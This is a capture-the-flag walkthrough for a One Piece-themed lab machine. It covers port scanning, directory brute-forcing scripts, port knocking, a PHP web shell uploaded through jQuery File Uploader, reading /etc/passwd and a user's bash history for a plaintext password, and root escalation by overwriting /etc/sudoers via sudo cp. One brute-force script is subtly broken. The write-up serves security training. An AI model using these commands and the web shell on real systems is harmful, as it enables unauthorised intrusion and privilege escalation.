# Zoro

One Piece CTF

## Vulnerabilities

-   Apache2 Options +Indexes  
-   Anonymous FTP
-   Anonymous Samba
-   Port Knocking
-   PHP disabled functions was not configured
-   Bad Permission configured (e.g. CHMOD 777)
-   Plain text password used in command line

## Requirements
- Linux (Ubuntu 14.04+)
- Windows XP
- NMAP
- Netcat
- Web Browser (with JavaScript enabled)
- Postman
- Python
- Git
- SSH

## Table of Contents
- nmap
- nc --verbose 10414
- http:27777
	- directories and files scanning
	- Manually DNS configuration (Host file)
	- grandline.htb:27777
	- members.grandline.htb:27777
- Anonymous FTP
	- Hidden Files
	- Zipped file with password
- Anonymous Network File Sharing (SMB)
	- QR code
- http:80
	- The Firewall
	- Connection Refused, Rejected with flag
	- Port Knocking
	- jQuery Files Uploader*
	- Reverse Shell Injection
		- PHP executable shell
		- commix (for executing reverse shell)
- Environment Scanning
	- Scan users
	- Scan user's files and permission
	- Get user's password (frankin)
- Privilege Escalation
	- Modifying `/etc/sudoers` using the available executable command
	- sudo
- Capture The Flag
	- Locate the flag
		- By determining process
		- By locate or find command

## Summary of successfully captured (TL;DR)

#### Port Knocking Sequence

The victim machine was protected by a Firewall rule
```
-A INPUT -p tcp -m tcp --dport 80 -j REJECT --reject-with icmp-port-unreachable
```
But has Port Knocking configured to disable that Firewall rule
```
[options] 
logfile = /var/log/knockd.log 

[openSSH] 
sequence = 193,550,478 
seq_timeout = 20 
command = /sbin/iptables -D INPUT -p tcp --dport 80 -j REJECT 
tcpflags = syn
```

|Sequence| Port Number | Where to Find | How to obtain
|--|--|--|--
| Key 1 | 193 | members.grandline.htb/bookie1223sa.txt | 48 columns per line
| Key 2 | 550 | ftp://anonymous@ip/enieslobby/.onepiece.zip/3.jpg | Unzip by using password `alabasta` from `nc -v VICTIM_IP 10414`
| Key 3 | 478 | smb://sambashared/2/qr code na ja |  Scan the QR code


#### Privilege Escalation and Capture The Flag
```
Sudoer = franky
Password = 3d2yhijinbe
Executable Command = /bin/cp
Flag path = /root/flag.txt
```


## Port Scan

Run nmap
```
nmap -sS -T4 -A -p- VICTIM_IP
```
There is something exposed in port 10414, That is 
```
KEY:alabasta
```


![enter image description here](https://scontent-nrt1-1.xx.fbcdn.net/v/t1.15752-9/53283379_639828596448725_5812145698535112704_n.png?_nc_cat=101&_nc_eui2=AeHS_i8Ii65xg0iFarKCGUT0shfskenrTcpaP-CASeJA5g4kunqHLAoQjBSeJRZcXJT-1pyalxGyU9MT8Bj7iIv0tQCmMmzeTT2UCEY6i7YzEQ&_nc_ht=scontent-nrt1-1.xx&oh=d98f8244f97ea2055506d3364dd70d5c&oe=5CE300BB)


And the available services are
| Port | Service | Status
|--|--|--
| 21 | FTP | Open
| 22 | SSH | Open
| 80 | HTTP | Filtered
| 445 | SMB | Open
| 2049 | NFS | Open
| 10414 |  | Open
| 27777 | HTTP | Open

![enter image description here](https://scontent-nrt1-1.xx.fbcdn.net/v/t1.15752-9/52281222_298557110817527_7352793116635561984_n.png?_nc_cat=101&_nc_eui2=AeEg4xMPP01MQRquUgJ7z0hedIZlHSqnCuo0FAI4DemCr4CGI1dBw6b60kPASA2c3rHQRIvae3vX_6g6wqJn5O4SI78q09R7_77tEwdCxCRMRg&_nc_ht=scontent-nrt1-1.xx&oh=c5f1e0a443443c6fd9c63bd4e0090545&oe=5D2306B7)


## Get Key 1 - HTTP:27777

Proceed these following steps:
 1. Request index.php to see what's inside.
 2. directories and files scanning
 3. Manually DNS configuration (Host file)
 4. grandline.htb:27777
 5. members.grandline.htb:27777

> Good Luck, Your brain will be fucked soon!

### GET /index.php

You will find a simple HTML document. And there seems to have nothing.
Ok, Don't give up. Let's do dictionary attack. See [Files and Directories Scanning]().


### Files and Directories Scanning

A python script has been used. The script read every lines in wordlist.txt (each line has only one word), then concatenate with file extensions. Then the requests were made by using [`requests`](http://docs.python-requests.org/en/master/) module. Successfully requests will be printed.

#### Request Script
```
#!/usr/bin/python3

import requests

target = "TARGET_IP:PORT" # REPLACE TARGET_IP WITH YOUR TARGET IP
words = open("wordlist.txt", "r")
for word in words:
    for extension in ["", "php", "html"]:
        r = requests.get(target+'/'+word.strip()+'.'+extension)
        if r.status_code == 200:
            print("/"+word.strip()+"."+extension)

```

#### Successfully Requests
```
/
/index.php
/ziggy.php
```

### GET :27777/ziggy.php

Luckily, This Apache2 server was configured with Options +Indexes. We can see any files in a directory.
`decode.txt` shown up.

### GET :27777/ziggy.php/decode.txt

Found BrainFuck code, Let's run or compile it using online compiler.

#### Code
```
# BrainFuck code
+++++ +++++ [->++ +++++ +++<] >+++. <+++[ ->+++ <]>++ .<+++ +[->- ---<]
>-.<+ ++[-> +++<] >++++ .<+++ [->-- -<]>- .++++ ++++. ---.+ ++++. -----
----. <++++ +++[- >---- ---<] >---- --.<+ +++++ +[->+ +++++ +<]>+ +++++
+++.< +++[- >+++< ]>+++ .<+++ +[->- ---<] >--.<
```
#### Result
```
grandline.htb
```

> Is that can be a DNS record?

### DNS record

The record was added to `host` file (in Linux, `/etc/hosts`)
```
TARGET_IP	grandline.htb		
```
> Replace TARGET_IP with the target ip address (e.g. 192.168.122.100).

### GET grandline.htb:27777/index.php

The response body changed. There is an additional image and a missing JavaScript file has been loaded together.

```
<img src="fox1.jpg">
<script src="http://members.grandline.htb/js/script.js"></script>
```
> 
Update DNS record again, For members.grandline.htb

### GET members.grandline.htb:27777

Found a simple web application. There is a form. Just fill the form!
> The only thing that can be done here is Guessing every characters in One Piece.

Make a word list from https://onepiece.fandom.com/wiki/List_of_Canon_Characters

```Add id="characters" into <table>```

```
let names = $("#characters").children("tbody").children("tr").children("td:nth-child(2)")

let makeWordList = (myList) => {
	let word = ""
	for(i=0; i<myList.length; i++) 
		word += (myList[i].innerText + "\n")
	return word
}

let wordList = makeWordList(names)

console.log(names)
```

```
A.O
Abdullah
Absalom
Acilia
Adele
Aggie 68
.
.
.
Foxy
.
.
.
```

### Hypothesis

If it is a correct guessing, The response body will be different.


```
#!/usr/bin/python3

import requests

target = "TARGET_IP:PORT" # REPLACE TARGET_IP WITH YOUR TARGET IP
words = open("onepieceCharacterList.txt", "r")
previousResponseBodySize = 576 # Config Response Body Size Here (You can obtain this value via Network tab in Inspect Elements)

for word in words:
    r = requests.post(target+'/'+word.strip()+'.'+extension)
    if r.status_code == 200:
	if r.size != previousResponseBodySize
            print("/"+word.strip()+"."+extension)

```

#### Correct Answer = Foxy

Additional HTML code was in the response body.
```
Correct
<meta http-equiv="refresh" content="30;url=/bookie1223sa.txt">
```

### GET members.grandline.htb:27777/bookie1223sa.txt

We found something, Is there a key here? 


> Hint: [ 24 x 48 ]

24 lines, 48 characters per line.

```
KEY 
IS 
193
```


## Get Key 2 - Anonymous FTP

 1. Access to FTP with anonymouse user
 2. List all files and directories (including hidden items)
 3. Found `enieslobby/.onepiece.zip`, Extract this file with password `alabasta` (The password exposed in `port 10414`)
 4. View Images Metadata using Exif
 5. Found a key

```
SECRET{KEY2} = 550
```

## Get Key 3 - Anonymous SMB

 1. Mount SMB (Windows XP has been used in the operation)
 2. Go to `sambashared/2` folder.
 3. You will found a QR code (filename `qr code na ja`)
 4. Scan it

```
KEY3 = 478
```
> 

## Port Knocking
After severals nmap attempts, we found that port 80 was accidentally opened. Why...?
Port knocking can be a possible action, because the port sequence was configured to 193, 550, 487.
Then after the nmap ran serveral times, The sequence is valid
```
First nmap: 193 and 550 was knocked as a sequence
Second nmap: 487 was knocked as a sequence
```

NetCat method

```
$ nc -v TARGET_IP 193
$ nc -v TARGET_IP 550
$ nc -v TARGET_IP 478
```

Knockd method
```
# apt install knockd -y
$ knockd TARGET_IP 193 550 478
```

Then, The firewall goes down and port 80 is now accessible.

# Shell Injection

In this step, we can upload a backdoor script.

## GET /

Found an open-source web application
```
jQuery-File-Uploader
```

### Hypothesis

 - Default PHP configuration allows the executable script to call system commands.
 - Allowed file types is not configured.

### Upload Shell Script

shell.php
```
<?php echo exec($_GET['cmd']) ?>;
```
> According to the open-source and its documentation, The default `upload_dir` is located at `./server/php/files`

### Let's Backdoor
```
python3 commix.py http://.../jQuery-File-Uploader/server/php/files/shell.php?cmd=whoami
```

# Privilege Escalation

Now, we have shell access. Let's walkthrough

```
$ whoami
> www-data
```
```
[www-data]$ pwd
> /var/www/phpmail
```
```
[www-data]$ cat /etc/passwd
> root:!:
> ...
> tester:$6$...
> john:$6$...
> loki:$6$...
> franky:$6$
```
```
[www-data]$ ls -la /home/*
> /home/franky
> -rwxrwxrwx .bash_history
```
> Nani??? Permission was set to 777
```
[www-data]$ cat /home/franky/.bash_history
> ...
> echo 3d2yhijinbe > realpassword.txt
> ...
```
> Nani??? Why use password in command line like this!
```
[me@localhost]$ ssh franky@...
Password: 3d2yhijinbe

[franky@ubuntu]$ sudo -l
> /bin/cp

[franky@ubuntu]$ sudo cp
cp: Missing Operands

[franky@ubuntu]$ pwd
> /home/franky

[franky@ubuntu]$ touch sudoers_Im_Coming
[franky@ubuntu]$ sudo cp /etc/sudoers ~/sudoers_Im_Coming
[franky@ubuntu]$ ls -l sudoers*
> rwxr-xr-x franky franky sudoers_Im_Coming
[franky@ubuntu]$ vi sudoers*
```
ViM screen
```

...
root	ALL=(ALL:ALL)
franky	...				:NOPASSWORD	/bin/cp # Change /bin/cp to /bin/bash
...


:wq
```

```
[franky@ubuntu]$ sudo -s 
[root@ubuntu]# cd /root
[root@ubuntu]# ls
> rwx------		root	root	flag.txt
> rwx------		root	root	smb.conf
[root@ubuntu]# vi flag.txt
```

```
Key=alabasta # Change it to whatever you like
```
